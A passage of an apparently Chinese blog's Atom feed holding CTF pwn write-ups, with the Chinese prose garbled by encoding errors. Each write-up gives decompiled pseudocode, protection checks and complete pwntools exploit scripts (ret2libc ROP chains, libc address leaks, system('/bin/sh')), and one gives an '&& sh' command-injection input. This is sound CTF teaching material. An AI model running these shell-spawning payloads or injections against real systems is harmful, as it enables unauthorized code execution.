class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = process1(buf);                           <span class="comment">// give buf a random value</span></span><br><span class="line">  process2(v2);                                 <span class="comment">// v2 is the process&#x27;s buf[7]</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-æ¼æ´åˆ†æ">2.æ¼æ´åˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç¨‹åºæ²¡æœ‰å¼€å¯PIEé˜²æŠ¤,é‚£ä¹ˆå°±å¯ä»¥ç”¨å¸¸è§çš„ret2libcæ‰‹æ³•æ¥è§£å†³é—®é¢˜äº†.</p><p>ç¨‹åºçš„æ‰§è¡Œæµå’Œæ”»å‡»æ‰‹æ®µå¤§æ¦‚è§£é‡Šä¸€ä¸‹,å…ˆç”Ÿæˆä¸€ä¸ªéšæœºæ•°,å°†å››ä½éšæœºæ•°ä¼ å…¥åˆ°<code>process1()</code>,åœ¨p1å‡½æ•°é‡Œé¢æœ‰ä¸€ä¸ªåˆ†æ”¯,è¦è¾“å…¥ä¸€ä¸ªæ•°å­—æ¥å’Œéšæœºæ•°æ¯”è¾ƒ,ä¸åŒåˆ™ç»“æŸ,ç›¸åŒåˆ™ç»§ç»­,è¿™é‡Œéœ€è¦çŸ¥é“çš„æ˜¯<code>strcmp()</code>å¦‚æœå…¶ä¸­ä¸€ä¸ªå­—ç¬¦ä¸²è¯»å–åˆ°<code>'\0'</code>çš„æ—¶å€™å°±ä¼šç»“æŸ.å½“p1å‡½æ•°ç»“æŸçš„æ—¶å€™å°†ä¼šè¿”å›<code>buf[7]</code>åˆ°<code>process2()</code>æ¥è¿›è¡Œä¸‹ä¸€ä¸ªåˆ†æ”¯åˆ¤æ–­,è¿™é‡Œæ‰“å¼€ç‚¹æ€è·¯,åœ¨<code>buf[0]</code>å°±ä¼ å…¥<code>'\0'</code>ç„¶åæŠŠæˆ‘ä»¬éœ€è¦çš„æ•°å­—ä¼ å…¥åˆ°<code>buf[7]</code>é‡Œé¢,p2å‡½æ•°é‡Œçš„buféå¸¸å¤§,å¦‚æœåªæ˜¯<code>buf[7]</code>æ”¹æˆ127ä¼šæ— æ³•æº¢å‡º,ä½†æ˜¯å¦‚æœæ”¹æˆå¤§çš„æ•°å­—å°±å¯ä»¥ç‹ ç‹ åœ°æº¢å‡ºäº†.</p><p>æ„é€ å®Œæ ˆæº¢å‡ºæ¼æ´ä¹‹å,å› ä¸ºç¨‹åºçš„.pltæ²¡æœ‰<code>system()</code>,ä¹Ÿæ²¡æœ‰ç»™å‡ºglibcçš„ç‰ˆæœ¬,å°±éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æ³„éœ²ç‰ˆæœ¬ç„¶åè°ƒç”¨<code>system(&quot;bin/sh&quot;)</code></p><p>è¿™é‡Œé¡ºä¾¿å¤ä¹ ä¸€ä¸‹æ­¥éª¤,è¿™é‡Œæ²¡å¼€PIEå°±ç›´æ¥ç”¨ELFæ–¹æ³•æ¥æ‰¾,æœ‰å¼€å°±å¾—æƒ³åŠæ³•æ³„éœ²å‡ºç¨‹åºçš„åŠ è½½åŸºåœ°å€ç„¶åå†è·å–æŸäº›åº“å‡½æ•°çš„.pltå’Œ.gotåœ°å€.</p><h3 id="1-è·å–ç¨‹åºä¸­æœ‰çš„å‡½æ•°çš„write-pltå’Œread-gotåœ°å€">(1) è·å–ç¨‹åºä¸­æœ‰çš„å‡½æ•°çš„write@pltå’Œread@gotåœ°å€</h3><p>è¿™é‡Œçš„<code>read()</code>ä¹Ÿå¯ä»¥æ˜¯åˆ«çš„å‡½æ•°,å®åœ¨æ²¡æœ‰å°±<code>__libc_start_main</code>ä¹Ÿæ˜¯å®Œå…¨okçš„,</p><p>ç”¨pltæ˜¯æ‹¿æ¥è¦†ç›–è¿”å›åœ°å€çš„,ç”¨gotåˆ™æ˜¯å› ä¸ºgotå­˜äº†libcå‡½æ•°çš„çœŸå®åœ°å€,å¯ä»¥æ‹¿å»ç»™åš<code>write()</code>çš„å‚æ•°.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=<span class="number">0xdeadbeef</span> <span class="comment">#è¿™ä¸ªæ˜¯è¿”å›åœ°å€</span></span><br></pre></td></tr></table></figure><h3 id="2-æ„é€ ROPé“¾æ¥æ³„éœ²åº“å‡½æ•°çœŸå®åœ°å€">(2) æ„é€ ROPé“¾æ¥æ³„éœ²åº“å‡½æ•°çœŸå®åœ°å€</h3><p>ç”±äºè¿™é‡Œæ„é€ çš„æ˜¯32ä½ç¨‹åºçš„ROPé“¾,å¦‚æœæ˜¯64ä½çš„è¿˜éœ€è¦è·å¾—pop retç³»åˆ—çš„gadgets</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=cyclic(offset)+p32(write_plt)+p32(main)+p32(read_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">read_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">&quot;read_addr:&quot;</span><span class="built_in">hex</span>(read_addr))</span><br></pre></td></tr></table></figure><h3 id="3-æ³„éœ²glibcç‰ˆæœ¬å¹¶è·å–éœ€è¦å‡½æ•°çš„çœŸå®åœ°å€">(3) æ³„éœ²glibcç‰ˆæœ¬å¹¶è·å–éœ€è¦å‡½æ•°çš„çœŸå®åœ°å€</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lic=LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_addr)</span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">info(<span class="string">&quot;system:&quot;</span>system)</span><br></pre></td></tr></table></figure><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29693</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x08048825&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;\x00&#x27;</span>+<span class="number">6</span>*<span class="string">b&#x27;a&#x27;</span>+p32(<span class="number">0xffffffff</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0xE7</span>+<span class="number">0x4</span></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=<span class="number">0x08048825</span></span><br><span class="line"></span><br><span class="line">payload2=cyclic(offset)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">read_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">&#x27;read_addr:&#x27;</span>+<span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line">base=read_addr-libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr=base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;bin/sh&#x27;</span>)) <span class="comment">##è¦ä»¥å­—èŠ‚å‹æ•°æ®æ¥æœç´¢!</span></span><br><span class="line">payload3=cyclic(offset)+p32(system_addr)+<span class="string">b&#x27;dead&#x27;</span>+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendline(payload3)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="4">4.</h2><p>è¿™é¢˜è§£ä¸å‡ºæ¥æœ‰ä»¥ä¸‹å‡ ä¸ªçŸ¥è¯†ç‚¹</p><h3 id="1">(1)</h3><p>ä¸ç¡®å®š<code>strcmp()</code>åœ¨é‡åˆ°<code>'\0'</code>çš„æ—¶å€™ä¼šç›´æ¥åœæ­¢æ¯”è¾ƒæ¥è·³è¿‡,å®é™…ä¸Šæ˜¯ä¼šçš„</p><h3 id="2">(2)</h3><p>å¿˜è®°äº†é¢˜ç›®æ²¡å¼€PIEå¯ä»¥ç›´æ¥æ‹¿glibcçš„å‡½æ•°å…ˆretçš„,è¿˜æœ‰å¿½ç•¥äº†é¢˜ç›®å·²ç»ç»™å‡ºäº†libcçš„ç‰ˆæœ¬â€¦</p><h3 id="3">(3)</h3><p>å¿˜è®°å†™æ³¨é‡Šå¯¼è‡´ç¬¬äºŒæ¬¡æ‰¾ä¸åˆ°çœŸæ­£æ”»å‡»çš„æ¼æ´æ˜¯ç¬¬äºŒä¸ªå‡½æ•°çš„elseåˆ¤æ–­.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-ä¼ªä»£ç &quot;&gt;1.ä¼ªä»£ç &lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2</summary>
      
    
    
    
    <category term="é¢˜è§£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>just test nc &amp;&amp; database Write Up</title>
    <link href="https://www.fomal.cc/posts/86c9736c.html"/>
    <id>https://www.fomal.cc/posts/86c9736c.html</id>
    <published>2023-04-02T03:02:22.716Z</published>
    <updated>2023-04-09T06:24:20.003Z</updated>
    
    <content type="html"><![CDATA[<p>1.ç”¨netcatè¿ä¸Šåœ°å€å°±èƒ½çœ‹åˆ°flag,catä¸€ä¸‹è·å–</p><p>2.å½“é€‰æ‹©6é€€å‡ºç³»ç»Ÿæ—¶,6å¯¹åº”çš„å‡½æ•°æœ‰å¾ˆä¸¥é‡çš„bug,ä¼šç”¨systemæ‰§è¡Œecho s,så°±æ˜¯è¾“å…¥çš„å‘½ä»¤,æˆ‘ä»¬åªéœ€è¦ç”¨&amp;&amp;åŒæ—¶è¾“å…¥å¤šæ¡å‘½ä»¤è°ƒç”¨shellå³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(command, <span class="string">&quot;echo %s&quot;</span>, s);</span><br><span class="line">system(command);</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">6 &amp;&amp; sh   </span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">pwn</span><br><span class="line"><span class="built_in">cat</span> flag</span><br><span class="line">......</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.ç”¨netcatè¿ä¸Šåœ°å€å°±èƒ½çœ‹åˆ°flag,catä¸€ä¸‹è·å–&lt;/p&gt;
&lt;p&gt;2.å½“é€‰æ‹©6é€€å‡ºç³»ç»Ÿæ—¶,6å¯¹åº”çš„å‡½æ•°æœ‰å¾ˆä¸¥é‡çš„bug,ä¼šç”¨systemæ‰§è¡Œecho s,så°±æ˜¯è¾“å…¥çš„å‘½ä»¤,æˆ‘ä»¬åªéœ€è¦ç”¨&amp;amp;&amp;amp;åŒæ—¶è¾“å…¥å¤šæ¡å‘½ä»¤è°ƒç”¨shellå³å¯&lt;/p&gt;
&lt;figure c</summary>
      
    
    
    
    <category term="é¢˜è§£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>jarvisoj_level2_x64 WP</title>
    <link href="https://www.fomal.cc/posts/17a38a07.html"/>
    <id>https://www.fomal.cc/posts/17a38a07.html</id>
    <published>2023-04-02T03:02:22.714Z</published>
    <updated>2023-04-09T06:24:14.037Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬åœ°æ²¡æœ‰æ‰“é€š,å†™å¾—éå¸¸éš¾å—çš„ç®€å•é¢˜</p><h2 id="1-ä¼ªä»£ç ">1.ä¼ªä»£ç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000600A90                               public hint</span><br><span class="line">.data:0000000000600A90 2F 62 69 6E 2F 73 68 00       hint db &#x27;/bin/sh&#x27;,0</span><br><span class="line">.data:0000000000600A90                               _data ends</span><br></pre></td></tr></table></figure><h2 id="2-åˆ†ææ¼æ´">2.åˆ†ææ¼æ´</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>åªå¼€å¯äº†NXä¿æŠ¤å¹¶ä¸”æœ‰æ ˆæº¢å‡ºæ¼æ´,è€Œä¸”shift+f12ç”šè‡³å‘ç°.dataå­˜äº†<code>bin/sh</code>,ä¸è¿‡æœ¬åœ°è°ƒè¯•å¥½åƒæœ‰é—®é¢˜,å¥½åƒæ˜¯shellä¸åŒæ‰€ä»¥æ‰§è¡Œ<code>system()</code>çš„æ—¶å€™ç¨‹åºç›´æ¥ç»“æŸäº†,è¿™é‡Œæˆ‘ç”¨äº†ä¸´æ—¶æ›´æ¢shellçš„å‘½ä»¤ä¸è¿‡æ²¡åˆ‡è¿‡æ¥,æœ€åç”¨äº†IDAçš„åç§»é‡æ„é€ äº†payload,ç”±äºæ˜¯x64ç¨‹åº,æ‰€ä»¥è¿˜éœ€è¦æ‰¾åˆ°<code>pop rdi ret</code>çš„gadgetæ‰èƒ½ä¼ å‚,è¿™é‡Œç”¨ä¸Šäº†ROPgadget.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./level2_x64 | grep <span class="string">&#x27;pop rdi&#x27;</span></span><br><span class="line">0x00000000004006b3 : pop rdi ; ret</span><br></pre></td></tr></table></figure><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26459</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./level2_x64&#x27;) ##æœ¬åœ°å¦¹æœ‰æ‰“é€š</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level2_x64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x80</span>+<span class="number">0x8</span></span><br><span class="line">system=<span class="number">0x04004C0</span></span><br><span class="line">bin_sh=<span class="number">0x0600A90</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x4006B3</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æœ¬åœ°æ²¡æœ‰æ‰“é€š,å†™å¾—éå¸¸éš¾å—çš„ç®€å•é¢˜&lt;/p&gt;
&lt;h2 id=&quot;1-ä¼ªä»£ç &quot;&gt;1.ä¼ªä»£ç &lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span</summary>
      
    
    
    
    <category term="é¢˜è§£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>jarvisoj_level2 1 WP</title>
    <link href="https://www.fomal.cc/posts/cb1b1517.html"/>
    <id>https://www.fomal.cc/posts/cb1b1517.html</id>
    <published>2023-04-02T03:02:22.712Z</published>
    <updated>2023-04-09T06:24:10.903Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-ä¼ªä»£ç ">1.ä¼ªä»£ç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-æ¼æ´åˆ†æ">2.æ¼æ´åˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>åªå¼€å¯äº†NXä¿æŠ¤,åœ¨ä¼ªä»£ç é‡Œé¢å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†<code>system</code>å’Œ<code>read</code>,ç„¶åè¾“å…¥æœ‰æ ˆæº¢å‡ºæ¼æ´,ç›´æ¥æä¸€ä¸‹ret2libc1å°±å‡ºäº†,è¯•ç€æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰<code>bin/sh</code>æˆ–è€…<code>sh</code>çš„ç‰‡æ®µ,ç¬”è€…ç”¨pwntoolsçš„searchæ‰¾åˆ°äº†<code>sh</code>çš„ç‰‡æ®µ,ä¸è¿‡è¿™é‡Œå¦‚æœä¼ å…¥çš„æ˜¯<code>bin/sh</code>çš„åœ°å€ä¼šæ‰“ä¸é€š(è¿™æ¡ç›´æ¥åœ¨ç»ˆç«¯è¾“å…¥ä¹Ÿæ˜¯ä¼šæŠ¥å‡ºç›¸åŒçš„é”™è¯¯(å‘½ä»¤ä¸å­˜åœ¨)),ç¬”è€…ä¼ å…¥çš„æ˜¯<code>sh</code>å°±æ‰“é€šäº†.</p><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x88</span>+<span class="number">0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#read_addr=elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"></span><br><span class="line">system_addr=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bin_sh=<span class="built_in">next</span>(elf.search(<span class="string">b&#x27;sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(system_addr)+p32(<span class="number">6</span>)+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-ä¼ªä»£ç &quot;&gt;1.ä¼ªä»£ç &lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2</summary>
      
    
    
    
    <category term="é¢˜è§£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
</feed>
